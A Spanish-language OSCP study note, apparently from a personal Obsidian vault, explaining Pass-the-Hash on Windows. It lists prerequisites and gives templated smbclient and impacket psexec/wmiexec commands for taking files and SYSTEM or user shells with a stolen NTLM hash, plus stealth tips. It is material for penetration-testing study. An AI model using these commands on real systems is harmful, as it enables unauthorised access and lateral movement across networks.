---
tipo: tecnica
fase: explotacion
so: windows
tags: [oscp, tecnica, explotacion, ad, password, windows]
fecha: 2026-10-05
---

# Pass-the-Hash

> [!abstract] Qué es y cuándo usarla
> Autenticarse con **usuario + hash NTLM** (sin crackear el password). Funciona porque los hashes NTLM/LM **no están salados** y son **estáticos** entre sesiones. Úsala cuando tengas un hash NTLM (ej. de [[Mimikatz]]) y la cuenta sea **admin local** en el destino — muy común que el `Administrator` local comparta password entre máquinas.

## Requisitos previos
- Hash **NTLM** de una cuenta con **admin local** en el objetivo.
- Si **no** usas el `Administrator` local → el destino necesita **UAC remote restrictions deshabilitado** (si no, falla la ejecución).

## Pasos
```bash
# Acceso a un share SMB con el hash
smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM>
smb: \> dir ; get secrets.txt

# Shell interactiva (formato de hash: LMHash:NTHash -> 32 ceros + NTLM)
impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> Administrator@<IP>   # shell SYSTEM
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM> Administrator@<IP>  # shell como el user
```

| Herramienta | Resultado |
|---|---|
| `smbclient --pw-nt-hash` | Montar/listar/descargar de un share SMB |
| `impacket-psexec -hashes` | Sube exe + crea servicio → shell como **SYSTEM** |
| `impacket-wmiexec -hashes` | Vía WMI → shell semi-interactiva como **el usuario** autenticado |

> [!tip] El hash va como `LMHash:NTHash`. Si solo tienes el NTLM, rellena el LM con **32 ceros**. Otros protocolos (RDP, WinRM) también aceptan PtH si el user tiene permisos.

> [!warning] Detección / problemas
> - Para **code execution** la cuenta debe ser **admin local** en el destino.
> - Con user que **no** es `Administrator` local → necesitas **UAC remote restrictions off** (por defecto están ON desde Vista → solo el `Administrator` local vale).
> - `psexec` da shell **SYSTEM**; `wmiexec` da shell como el **usuario** (más sigiloso, menos artefactos).

## Visto en
- Módulo: [[16 - Password Attacks]]
- Relacionado: [[Mimikatz]] · [[Net-NTLMv2 (Responder y Relay)]]
- Máquinas: [[]]
